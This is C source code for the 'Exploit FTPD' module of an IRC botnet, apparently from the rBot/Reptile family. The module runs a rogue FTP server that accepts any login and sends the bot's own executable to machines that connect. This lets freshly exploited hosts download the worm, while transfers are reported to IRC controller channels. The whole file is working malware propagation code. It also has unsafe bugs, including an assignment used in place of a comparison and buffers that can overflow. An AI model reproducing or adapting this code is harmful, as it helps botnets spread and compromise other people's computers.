/*  FTPD Originally By: Stoney  */

#include "includes.h"
#include "functions.h"

#ifndef NO_EFTPD

#pragma warning(disable : 4018)

int	FTP_PORT;
SOCKET listener;

DWORD WINAPI ftpd(LPVOID pParam) {
	FTP ftp = *((FTP *)pParam);
	FTP *ftps = (FTP *)pParam;
	ftps->gotinfo = TRUE;
	IRC* irc=(IRC*)ftp.conn;
	
	SOCKET newfd;
	char sendbuf[IRCLINE];
	struct sockaddr_in server_address;
	struct sockaddr_in remoteaddr;
	long h;
	int reuse_addr = 1;
	unsigned long mode = 1;
	int fdmax;
	int i;
	int addrlen;
	int nbytes;
	
	char buf[100];
	char tmpbuf[100];
	char tmpbuf2[100];
	char a[4];
	char b[4];
	char c[4];
	char d[4];
	char p1[50];
	char p2[50];
	char tmpip[15];
	int po,po2;

	struct fd_set master;   // master file descriptor list
	struct fd_set read_fds; // temp file descriptor list for select()

	FD_ZERO(&master);		// clear the master and temp sets
	FD_ZERO(&read_fds);

	FTP_PORT = ftp.port;
	listener = fsocket(AF_INET, SOCK_STREAM, 0);
	fsetsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse_addr,sizeof(reuse_addr));
	fioctlsocket(listener, FIONBIO, &mode);

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = fhtons(FTP_PORT);

	if (fbind(listener, (struct sockaddr *) &server_address,sizeof(server_address)) < 0 ) {
		return 1;
	}

	flisten(listener,10);

	FD_SET(listener, &master);

	fdmax = listener;

	while(1) {
		read_fds = master;
		if (fselect(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
			return 1;
    	}
		for(i = 0; i <= fdmax; i++) {
			ZeroMemory(buf,sizeof(buf));
			ZeroMemory(tmpbuf,sizeof(tmpbuf));
			if (fFD_ISSET(i, &read_fds)) {
				if (i == (int)listener) {
					addrlen = sizeof(remoteaddr);
					if ((newfd = faccept(listener, (struct sockaddr *)&remoteaddr,&addrlen)) != -1) {
						FD_SET(newfd, &master);
						if ((int)newfd > fdmax) {
							fdmax = newfd;
						}
						fsend(newfd, "220 Reptile welcomes you..\r\n",28 , 0);
					}
				} else {
					if ((nbytes = frecv(i, buf, sizeof(buf), 0)) <= 0) {
						FD_CLR(i, &master);
						fclosesocket(i);
					} else {

#ifdef _DEBUG
						printf("FTP Recieved: %s\n",buf);
#endif
						sscanf(buf,"%s %s",tmpbuf,tmpbuf2);
						if (strcmp(tmpbuf,"USER") == 0) {
							fsend(i,"331 Password required\r\n",23,0);
						}
						else if (strcmp(tmpbuf,"PASS") == 0) {
							fsend(i,"230 User logged in.\r\n",21,0);
						}
						else if (strcmp(tmpbuf,"SYST") == 0) {
							fsend(i,"215 StnyFtpd\r\n",14,0);
						}
						else if (strcmp(tmpbuf,"REST") == 0) {
							fsend(i,"350 Restarting.\r\n",17,0);
						}
						else if (strcmp(tmpbuf,"PWD") == 0) {
							fsend(i,"257 \"/\" is current directory.\r\n",31,0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"A") == 0)) {
							fsend(i,"200 Type set to A.\r\n",20,0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"I") == 0)) {
							fsend(i,"200 Type set to I.\r\n",20,0);
						}
						else if (strcmp(tmpbuf,"PASV") == 0) {
							fsend(i,"425 Passive not supported on this server\r\n",44,0);
						}
						else if (strcmp(tmpbuf,"LIST") == 0) {
							fsend(i,"226 Transfer complete\r\n",25,0);
							if (irc->has_master())
								irc->notice_masters("%s %s LIST request from: %s",warn_title,ftp_title,GetIP(i));
							else
								irc->privmsg(servers[curserver].warningchan,"%s %s LIST request from: %s",warn_title,ftp_title,GetIP(i));
						}
						else if (strcmp(tmpbuf,"PORT") == 0) {
							sscanf(buf,"%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]",a,b,c,d,p1,p2);
							po = atoi(p1);
							po2 = atoi(p2);
							ZeroMemory(p1,sizeof(p1));
							sprintf(p1,"%x%x\n",po,po2);
							h = strtoul(p1, NULL, 16);
							sprintf(tmpip,"%s.%s.%s.%s",a,b,c,d);
							fsend(i,"200 PORT command successful.\n",29,0);

						}
						else if (strcmp(tmpbuf,"RETR") == 0) {
							if (!ftp.silent && ftp.verbose)
								irc->privmsg(ftp.chan,"%s Started send to IP: %s.",ftp_title,tmpip);
							fsend(i,"150 Opening BINARY mode data connection\n",40,0);
							SOCKET data_sock;
							if(FTP_Data_Connect(tmpip,(int)h,sendbuf,ftp.conn,ftp.chan,ftp.silent,data_sock) != 0) {
								int transfered=0;
								if ((transfered=FTP_Data_Transfer(data_sock)) > 0)
								{
									fsend(i,"226 Transfer complete.\n",23 , 0);
									eftpsends++;
									if (!ftp.silent)
									{
										if (ftp.verbose)
											irc->privmsg(ftp.chan,"%s File transfer complete to IP: %s, File: %s, Size: %s bytes, Total sends: %i.",ftp_title,tmpip,ftp.filename,commaI64(transfered),eftpsends);
										else
											irc->privmsg(ftp.chan,"%s File transfer complete to IP: %s.", ftp_title, tmpip);
									}
								}
								else
								{
									fsend(i,"226 Transfer complete.\n",23 , 0);
								}
							} else {
								fsend(i,"425 Can't open data connection.\n",32,0);
								if (!ftp.silent)
								{
									irc->privmsg(ftp.chan,"%s Failed to send file to IP: %s.",ftp_title,tmpip);
								}
							}
						}
						else if (strcmp(tmpbuf,"QUIT") == 0) {
							fsend(i,"221 Goodbye, happy rooting.\r\n",29 , 0);
						}
						else {
							fsend(i,"503 Command not understood.\r\n",29,0);
						}
						ZeroMemory(buf,sizeof(buf));
					}
				}
			}
		}
	}
	return 1;
}

int FTP_Data_Connect(char *ip,int port,char *err,void *conn,char *target,BOOL silent,SOCKET &data_sock)
{
	IRC* irc=(IRC*)conn;
	struct sockaddr_in server;

	data_sock = fsocket(AF_INET, SOCK_STREAM, 0);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = finet_addr(ip);
    server.sin_port = fhtons(port);

	if (fconnect(data_sock,(struct sockaddr *)&server, sizeof(struct sockaddr)) == -1)
	{
		if (!silent)
			irc->privmsg(target,"%s Couldn't open data connection to: %s:%i, error: <%d>.",ftp_title,ip,port,fWSAGetLastError());
		fclosesocket(data_sock);
		return 0;
	}
	return 1;
}

int FTP_Data_Transfer(SOCKET data_sock)
{
	unsigned char fileBuf[4096]; FILE *fp=NULL;
	char myfname[MAX_PATH];
	int count=4096;
	GetModuleFileName(NULL,myfname,sizeof(myfname));
	fp=fopen(myfname, "rb");
	int sent=0;
	long filesize=0;
	if (fp)
	{
		fseek(fp, 0, SEEK_END); filesize=ftell(fp); fseek(fp, 0, SEEK_SET);
		int written=0;
		while(!feof(fp))
		{
			written=0;
			int retval;
			ZeroMemory(fileBuf,sizeof(fileBuf));
			count=fread(fileBuf, sizeof(char), 2048, fp);
			if(ferror(fp)) break;
			while(written<count)
			{
				retval = fsend(data_sock, (char*)fileBuf, count, 0);
				sent+=retval;
				if (retval = SOCKET_ERROR)
					break;
				written+=retval;
			}
		}
	}
	fclose(fp);
	fclosesocket(data_sock);
	if ((int)filesize == sent)
		return sent;
	else
		return 0;
}

void killftpd(char *target,void *conn,BOOL silent,BOOL verbose)
{
	IRC* irc=(IRC*)conn;
	BOOL killed = FALSE;
	int tnum;
	if ((tnum=findthreadnum(FTPD_THREAD)) > 0)
	{
		TerminateThread(threads[tnum].tHandle, 0);
		if (threads[tnum].tHandle != 0) 
			killed = TRUE;
		
		threads[tnum].tHandle = 0;
		threads[tnum].id = 0;
		threads[tnum].parent = 0;
		threads[tnum].pid = 0; 
		threads[tnum].name[0] = '\0';

		fclosesocket(listener);
	}

	if (killed)
	{
		if (!silent)
			irc->privmsg(target,"%s %s stopped. (%d thread(s) stopped.)",threads_title,"Exploit FTPD",1);
	}
	else
	{
		if (!silent)
			irc->privmsg(target,"%s No %s thread found.",threads_title,"Exploit FTPD");
	}
	return;
}

#endif

